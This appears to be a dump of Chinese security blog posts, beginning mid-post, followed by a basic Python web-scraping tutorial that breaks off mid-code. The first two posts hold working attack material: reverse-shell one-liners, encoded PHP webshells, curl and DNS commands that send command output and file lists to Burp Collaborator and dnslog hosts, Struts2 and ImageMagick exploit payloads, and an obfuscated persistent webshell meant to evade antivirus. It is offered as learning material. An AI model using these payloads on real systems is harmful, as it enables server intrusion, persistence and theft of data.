&amp;$count ]] ) 搜索subject中匹配pattern的部分， 以replacement进行替换。 preg_replace — 执行一个正则表达式的搜索和替换,/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码。 1preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;); 如果我们提交 ?h=phpinfo()，/e就会将h参数当做PHP代码，phpinfo()将会被执行。 create_function() create_function — 创建一个匿名函数。 12$newfunc = create_function(&#x27;$v&#x27;, &#x27;return system($v);&#x27;);$newfunc(&#x27;whoami&#x27;); call_user_func() call_user_func — 把第一个参数作为回调函数调用。 1mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 call_user_func_array() call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数 1mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 命令执行与代码执行获取shell 命令执行获取shell 反弹shell 1syetem(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124&#x2F;443 0&gt;&amp;1&#39;); 写shell 12echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.phpecho &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php 1wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 代码执行获取shell 反弹shell 1eval(&#39;$sock&#x3D;fsockopen(&quot;124&quot;,443);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;) 写shell 1eval(&#39;@fputs(fopen(base64_decode(&#39;bG9zdC5waHA&#x3D;&#39;),w),base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs&#x2F;Pg&#x3D;&#x3D;&#39;));&#39;) 命令执行无回显后台代码 1234&lt;?php$a &#x3D; $_GET[&#39;id&#39;];echo(shell_exec($a));?&gt; 1、利用延时来判断是有具有命令执行漏洞1http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;sleep%204 如果执行后延时5秒，就证明测试点存在命令执行漏洞。 2、利用http请求ping命令不会发起http请求。 使用curl发起http请求 1http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;1.php?id&#x3D;curl%20127.0.0.1:1234 vps上监听端口1234 12345678910➜ ~ ncat -lnvp 1234Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:53979.GET &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1:1234User-Agent: curl&#x2F;7.64.1Accept: *&#x2F;* 可以看到命令成功执行。 1➜ ~ curl 5lruf1898h08u379lms247tj6ac00p.burpcollaborator.net&#x2F;&#96;whoami&#96; 3、DNS请求利用DNS解析请求，我们可以构造一个二级级域名，当他发起一级域名请求的时候，可以去查看DNS解析请求，而我们在二级域名中，插入我们的命令，此时命令即被执行，执行成功之后的结果也可以在DNS解析请求中查到。 比如： 一个一级域名 1rjs8aa.dnslog.cn 我们构造一个二级域名 1curl &#96;whoami&#96;.rjs8aa.dnslog.cn 利用dns平台dnslog.cn或者cheye.io、也可以使用burp的Collaborator Client功能，可以看到我们的DNS请求，进而拿到我们命令执行的结果。 注意：1、DNS每一级域名长度的限制是63个字符，这时候如果数据带不出来，可以尝试shell脚本，截取某一部分带出数据。 目标系统执行 1steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;$i.bbqkz7t5xci7vcuexsmvnmrdd4jw7l.burpcollaborator.net&#x2F;&quot;;done;&#96; 利用VPS搭建一个临时服务器，在攻击机器上请求VPS地址。 123456789➜ ~ python -m SimpleHTTPServer 7777Serving HTTP on 0.0.0.0 port 7777 ...172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.py HTTP&#x2F;1.1&quot; 404 -172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;1.txt HTTP&#x2F;1.1&quot; 404 -172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] &quot;GET &#x2F;公共 HTTP&#x2F;1.1&quot; 404 -172.20.10.10 - - [11&#x2F;Nov&#x2F;2020 22:46:02] code 404, message File not found 1steady@steady:~$ &#96;for i in $(ls);do curl &quot;http:&#x2F;&#x2F;172.20.10.4:7777&#x2F;$i&quot;;done;&#96; 可以看到数据成功被带出来。 2、如果系统限制了某些特殊字符与特殊符号，我们可是借助Linux系统，先将输出的内容进行base64编码，然后在将内容带出的系统之外。在kali下： 1234steady@steady:~$ ls|base64MS5weQoxLnR4dArlhazlhbEK5qih5p2/CuinhumikQrlm77niYcK5paH5qGjCuS4i+i9vQrpn7PkuZAK5qGM6Z2iCmRhdGEudHh0CmRucy50eHQKZ2V0LXBpcC5weQpzdGVhZHkudHh0CnRjcC50eHQKdXJsLnR4dAp1c2JkYXRhLnR4dAo= ping命令不能使用base64编码的方式 12steady@steady:~$ ping `ls|base64`.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.netping: dXJsLnR4dAp1c2JkYXRhLnR4dAo=.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.net: 未知的名称或服务 但是可以使用curl命令发起http请求。配合base64编码绕过限制。 1➜ ~ curl ypr24cta9q60inhb0h4sxid9g0mqaf.burpcollaborator.net&#x2F;&#96;ls|base64&#96; 命令执行常见数据带出的方式base64编码12steady@steady:~$ pwd | base64L2hvbWUvc3RlYWR5Cg&#x3D;&#x3D; 配合linux文本处理命令12steady@steady:~$ pwd | od -A n -t x1 | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;2f686f6d652f7374656164790a curl与数组、sed命令 curl 是可以跟数组的，每个都会进行请求。 1234➜ ~ curl $(echo &#39;c.com b.com a.com&#39;)curl: (52) Empty reply from servercurl: (52) Empty reply from servercurl: (52) Empty reply from server 12345steady@steady:~$ curl $(find &#x2F;home&#x2F;steady -name &#39;*.txt&#39;|od -A n -t x1|sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;|sed -r &#39;s&#x2F;$&#x2F;.9rg7oe.dnslog.cn&#x2F;g&#39;)curl: (7) Failed to connect to 2f686f6d652f7374656164792f2e6d6f.9rg7oe.dnslog.cn port 80: 拒绝连接curl: (7) Failed to connect to 7a696c6c612f66697265666f782f786f.9rg7oe.dnslog.cn port 80: 拒绝连接curl: (7) Failed to connect to 673474326b6d2e64656661756c742d65.9rg7oe.dnslog.cn port 80: 拒绝连接curl: (7) Failed to connect to 73722f53697465536563757269747953.9rg7oe.dnslog.cn port 80: 拒绝连接 12steady@steady:~$ xxd -r -p 1.txterviceState.txt 常见命令执行payload查找某目录可写的文件 1curl $(find &#x2F;dir -type d -writable |od -A n -t x1|sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;|sed -r &#39;s&#x2F;$&#x2F;.ksdjop.dnslog.cn&#x2F;g&#39;) 命令执行绕过 绕过空格 在bash下 1234appledeMacBook-Pro:~ apple$ echo$IFS$9&quot;111&quot;;111appledeMacBook-Pro:~ apple$ echo$&#123;IFS&#125;&quot;111&quot;111 敏感字符绕过 利用变量绕过 123ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ a&#x3D;c;b&#x3D;a;c&#x3D;t;ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ $a$b$c 1.txtabc 利用base编码绕过 1234ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ echo &#39;cat&#39; | base64Y2F0Cg&#x3D;&#x3D;ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ &#96;echo &#39;Y2F0Cg&#x3D;&#x3D;&#39; | base64 -d&#96; 1.txtabc CVE漏洞Smarty &lt;= 3.1.32 php代码执行产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行。 利用payload： 1*&#x2F;phpinfo();&#x2F;* Struts2命令执行产生原因：产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行 利用payload： 1%&#123;(#nikenb&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;cat &#x2F;etc&#x2F;passwd&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; ImageMagick 命令执行产生原因： ImageMagick内置了非常多的图像处理库,通过系统的 system() 命令来调用外部的 lib 进行处理。调用外部 lib 的过程是使用系统的 system 命令来执行的，导致命令执行的代码。 利用payload： 1234push graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;&quot;|id; &quot;)&#39;pop graphic-context Apache SSI 远程命令执行漏洞产生原因：上传含有命令执行指令的shtml文件，可以导致命令执行。 利用payload： 1&lt;?-- cmd&#x3D;&quot;cat &#x2F;root&#x2F;flag.txt&quot;--?&gt; 总结防御方式 指定黑名单，禁止使用各种危险命令、或者危险函数，并在php.ini中配置disable_functions。 程序参数可控的情况下使用escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$`, \\x0A 和 \\xFF。 &#39; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 程序参数值可控的情况下使用escapeshellarg() 确保传递给命令安全的参数。 二者区别： 12345678escapeshellarg1.确保用户只传递一个参数给命令2.用户不能指定更多的参数一个3.用户不能执行不同的命令escapeshellcmd1.确保用户只执行一个命令2.用户可以指定不限数量的参数3.用户不能执行不同的命令 漏洞挖掘eval()函数与system()函数的区别 前者是执行一段代码，而不是命令，需要加分号。后者执行的是系统命令，而不是一段php代码。","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"http://s1eady.top/categories/OWASP-TOP10/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"PHPSHELL-bypass","slug":"PHP木马","date":"2018-12-08T05:20:12.000Z","updated":"2020-10-26T02:19:48.576Z","comments":true,"path":"2018/12/08/PHP木马/","link":"","permalink":"http://s1eady.top/2018/12/08/PHP%E6%9C%A8%E9%A9%AC/","excerpt":"","text":"PHP免杀学习123456789101112131415161718192021&lt;?phpset**time**limit(0);ignore**user**abort(true);$file = &#x27;phpinfo.php&#x27;;$shell =&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;;while(true)&#123;file_put_contents($file,base64_decode($shell));usleep(50);&#125;?&gt; PHP中的ignore_user_abort函数是当用户关掉终端后脚本不停止仍然在执行，可以用它来实现计划任务与持续进程。 set_time_limit(0); 括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。 在PHP中暂停代码执行一定时间，有两个函数可以实现，一个是sleep()，另一个是usleep()，它们参数都是一个整数值。sleep()是暂停多少秒，usleep()是暂停多少微秒。 12345678910&lt;?php $str1 = &#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;; $str2 = strtr($str1,array(&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;=&gt;&#x27;as&#x27;,&#x27;fdgdefjg0J)&#x27;=&gt;&#x27;se&#x27;,&#x27;r&amp;%F%*^G*t&#x27;=&gt;&#x27;rt&#x27;)); $str3 = strtr($str2,array(&#x27;s,&#x27;=&gt;&#x27;s&#x27;,&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;=&gt;&#x27;er&#x27;)); if(md5(@$_GET[&#x27;a&#x27;]) ==&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;)&#123; $str4 = strrev($_POST[&#x27;a&#x27;]); $str5 = strrev($str4); $str3($str5); &#125;?&gt; e10adc3949ba59abbe56e057f20f883e==123456 strrev反转字符串 strtr() 函数转换字符串中特定的字符。 关于三个字符串 12➜ ~ php -r &quot;print(strtr(&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;,array(&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;=&gt;&#x27;as&#x27;,&#x27;fdgdefjg0J)&#x27;=&gt;&#x27;se&#x27;,&#x27;r&amp;%F%*^G*t&#x27;=&gt;&#x27;rt&#x27;)));&quot;assert 最后得到assert($_POST[‘a’]) 最后post数据a=代码，访问phpinfo.php?a=123456。","categories":[{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/categories/By-pass/"}],"tags":[{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/tags/By-pass/"}]},{"title":"Python学习--Python爬虫基础","slug":"Python爬虫","date":"2018-12-06T23:20:30.000Z","updated":"2020-11-12T02:10:11.487Z","comments":true,"path":"2018/12/07/Python爬虫/","link":"","permalink":"http://s1eady.top/2018/12/07/Python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Python爬虫Requests库Get请求12345678910111213141516171819202122import requests# 带参数的GET请求,timeout请求超时时间headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;&#125;#params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()params = &#123;&#x27;key1&#x27;: &#x27;python&#x27;, &#x27;key2&#x27;: &#x27;java&#x27;&#125;#发送get请求并带上参数以及请求头,设置超时时间。r = requests.get(url=&#x27;http://baidu.com&#x27;,headers=headers,params=params, timeout=3)# 注意观察url地址，它已经将参数拼接起来print(&#x27;URL地址：&#x27;, r.url)# 响应状态码，成功返回200，失败40x或50x。print(&#x27;请求状态码：&#x27;, r.status_code)print(&#x27;header信息:&#x27;, r.headers)print(&#x27;cookie信息：&#x27;, r.cookies)#返回响应数据,html内容。print(&#x27;响应的数据：&#x27;, r.text)# 如响应是json数据 ，可以使用 r.json()自动转换为dictprint(&#x27;响应json数据&#x27;, r.json()) 123456789101112131415161718192021URL地址： http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java请求状态码： 200header信息: &#123;&#39;Date&#39;: &#39;Mon, 28 Sep 2020 07:02:06 GMT&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;, &#39;Content-Length&#39;: &#39;373&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Server&#39;: &#39;gunicorn&#x2F;19.9.0&#39;, &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;, &#39;Access-Control-Allow-Credentials&#39;: &#39;true&#39;&#125;cookie信息： &lt;RequestsCookieJar[]&gt;响应的数据： &#123; &quot;args&quot;: &#123; &quot;key1&quot;: &quot;python&quot;, &quot;key2&quot;: &quot;java&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*&#x2F;*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;, &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&quot; &#125;, &quot;origin&quot;: &quot;111.14.212.75&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&quot;&#125;响应json数据 &#123;&#39;args&#39;: &#123;&#39;key1&#39;: &#39;python&#39;, &#39;key2&#39;: &#39;java&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;python-requests&#x2F;2.23.0&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&#39;&#125;, &#39;origin&#39;: &#39;111.14.212.75&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&#39;&#125; Post请求1234567891011121314151617import requestsurl = &quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;&#125;data = &#123; &#x27;first&#x27;: &#x27;true&#x27;, &#x27;pn&#x27;: 1, &#x27;kd&#x27;: &#x27;python&#x27;&#125;resp = requests.post(url,headers=headers,data=data)# 如果是json数据，直接可以调用json方法print(resp.json()) 1&#123;&#39;status&#39;: False, &#39;msg&#39;: &#39;请求成功!&#39;, &#39;clientIp&#39;: &#39;111.14.212.75&#39;, &#39;state&#39;: 2402&#125; 随机浏览器头12345678910from bs4 import BeautifulSoupimport requests from fake_useragent import UserAgentua = UserAgent()ua.update() # 更新用户代理列表 headers = &#123;&#x27;User-Agent&#x27;: ua.random&#125; response = requests.get(&#x27;http://steady.net&#x27;, headers=headers) Get请求与Post请求设置代理使用requests添加代理也非常简单，只要在请求的方法中（比如get或者post）传递proxies参数就可以了。 1234567891011121314import requestsurl = &quot;http://httpbin.org/get&quot;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,&#125;proxy = &#123; &#x27;http&#x27;: &#x27;171.14.209.180:27829&#x27;&#125;resp = requests.get(url,headers=headers,proxies=proxy)print(resp.text) 处理请求包123456789import requestsurl = &quot;http://baidu.com&quot;respone=requests.get(&quot;http://baidu.com&quot;)print(respone.headers)print(respone.headers[&#x27;Server&#x27;]) 123➜ Desktop python3 1.py&#123;&#x27;Date&#x27;: &#x27;Mon, 28 Sep 2020 07:20:24 GMT&#x27;, &#x27;Server&#x27;: &#x27;Apache&#x27;, &#x27;Last-Modified&#x27;: &#x27;Tue, 12 Jan 2010 13:48:00 GMT&#x27;, &#x27;ETag&#x27;: &#x27;&quot;51-47cf7e6ee8400&quot;&#x27;, &#x27;Accept-Ranges&#x27;: &#x27;bytes&#x27;, &#x27;Content-Length&#x27;: &#x27;81&#x27;, &#x27;Cache-Control&#x27;: &#x27;max-age=86400&#x27;, &#x27;Expires&#x27;: &#x27;Tue, 29 Sep 2020 07:20:24 GMT&#x27;, &#x27;Connection&#x27;: &#x27;Keep-Alive&#x27;, &#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;Apache respone.headers请求包的请求头，返回值是一个字典。 通过对字典操作，取出对应的请求头。 超时1234567import requestsurl = &quot;http://baidu.com&quot;respone=requests.get(&quot;http://sss.com&quot;,timeout=1)print(respone.reason) 1requests.exceptions.ConnectTimeout: HTTPConnectionPool(host=&#x27;sss.com&#x27;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x10f118550&gt;, &#x27;Connection to sss.com timed out. (connect timeout=1)&#x27;)) timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out。 cookie操作获取cookie 123456import requestsr = requests.get(&quot;https://www.csdn.net&quot;)print(type(r.cookies), r.cookies)for key, value in r.cookies.items(): print(key + &#x27;=&#x27; + value) 1234&lt;class &#39;requests.cookies.RequestsCookieJar&#39;&gt; &lt;RequestsCookieJar[&lt;Cookie dc_session_id&#x3D;10_1575798031732.659641 for .csdn.net&#x2F;&gt;, &lt;Cookie uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184 for .csdn.net&#x2F;&gt;, &lt;Cookie acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 for www.csdn.net&#x2F;&gt;]&gt;dc_session_id&#x3D;10_1575798031732.659641uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 在 Requests 中我们使用 cookies 属性就可以直接得到 Cookies 。通过打印我们可以发现它的类型是 requests.cookies.RequestsCookieJar ，然后用 items() 方法将其转化为元组组成的列表，遍历输出每一个 Cookie 的名称和值，实现 Cookie 的遍历解析。 共享cookie 12345678910111213141516171819202122232425import requests# 通过Session类新建一个会话session = requests.Session()post_url = &#x27;https://passport.weibo.cn/sso/login&#x27;# 往下使用requests的地方，直接使用session即可，session就会保存服务器发送过来的cookie信息headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://passport.weibo.cn/signin/login?entry=mweibo&amp;r=http%3A%2F%2Fweibo.cn%2F&amp;backTitle=%CE%A2%B2%A9&amp;vt=&#x27;,&#125;data = &#123; &#x27;username&#x27;: &#x27;17312345678&#x27;, # 账号 &#x27;password&#x27;: &#x27;password&#x27;, # 密码&#125;r = session.post(url=post_url, data=data, headers=headers)# 上面的session会保存会话，往下发送请求，直接使用session即可url = &#x27;https://weibo.cn/6388179289/info&#x27;headers1 = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;,&#125;r = session.get(url=url, headers=headers1)print(r.text) 123456import requestss&#x3D;requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(s.text)print(r.text) 可以发现两次get请求第一次有cookie但是第二次没cookie 12345678910➜ ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125;&#123; &quot;cookies&quot;: &#123;&#125;&#125; 如果使用Session() 1234567import requestss &#x3D; requests.Session()s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)print(s.text)r &#x3D; s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(r.text) 可以看到两个回话都带有相同cookie 123456789101112➜ ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125;&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125; requests请求返回对象Response的常用方法Response响应类常用属性与方法： 123456789101112131415Response.url 请求url，[见示例2.1]Response.status_code 响应状态码，[见示例2.1]Response.text 获取响应内容，[见示例2.1]Response.json() 活动响应的JSON内容，[见示例2.1]Response.ok 请求是否成功，status_code&lt;400 返回TrueResponse.headers 响应header信息，[见示例2.1]Response.cookies 响应的cookie，[见示例2.1]Response.elapsed 请求响应的时间。Response.links 返回响应头部的links连接，相当于Response.headers.get(&#39;link&#39;)Response.raw 获取原始套接字响应，需要将初始请求参数stream&#x3D;TrueResponse.content 以字节形式获取响应提，多用于非文本请求，[见示例2.2]Response.iter_content() 迭代获取响应数据，[见示例2.2]Response.history 重定向请求历史记录Response.reason 响应状态的文本原因，如：&quot;Not Found&quot; or &quot;OK&quot;Response.close() 关闭并释放链接，释放后不能再次访问’raw’对象。一般不会调用。 requests的content和text方法的区别 resp.text返回的是Unicode型的数据。 resp.content返回的是bytes型也就是二进制的数据。 简而言之，.text是现成的字符串，.content还要编码，但是.text不是所有时候显示都正常，这是就需要用.content进行手动编码。通常我们需要.content.decode(&#39;编码格式&#39;)，其中编码格式我们需要右键网页源代码，查看网页的编码。 如果你想取文本，可以通过r.text。 如果想取图片，文件，则可以通过r.content。 12345678import requestsjpg_url &#x3D; &#39;http:&#x2F;&#x2F;img2.niutuku.com&#x2F;1312&#x2F;0804&#x2F;0804-niutuku.com-27840.jpg&#39;content &#x3D; requests.get(jpg_url).contentwith open(&#39;demo.jpg&#39;, &#39;wb&#39;) as fp: fp.write(content) 数据提取XPathxpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。 XPath语法 XPATH语法 补充 / 如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点 // 从全局节点中选择节点，随便在哪个位置 @ 选取某个节点的属性 . 当前节点 lxml库lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。 导入lxml 的 etree 库 from lxml import etree 利用etree.HTML，将html字符串（bytes类型或str类型）转化为Element对象，Element对象具有xpath的方法，返回结果的列表 12html &#x3D; etree.HTML(text) ret_list &#x3D; html.xpath(&quot;xpath语法规则字符串&quot;) xpath方法返回列表的三种情况 返回空列表：根据xpath语法规则字符串，没有定位到任何元素 返回由字符串构成的列表：xpath字符串规则匹配的一定是文本内容或某属性的值 返回由Element对象构成的列表：xpath规则字符串匹配的是标签，列表中的Element对象可以继续进行xpath BeautifulSoup4Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。lxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM（Document Object Model）的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。BeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持CSS选择器、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。 Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag NavigatableString BeautifulSoup Comment 创建bs对象1from bs4 import BeautifulSoupimport requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;book.douban.com&#x2F;&#39;).text# print(response)# 创建bs对象soup &#x3D; BeautifulSoup(response, &#39;lxml&#39;) # 使用到了lxml解析库 Tag12345678910111213141516171819from bs4 import BeautifulSouphtml = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; 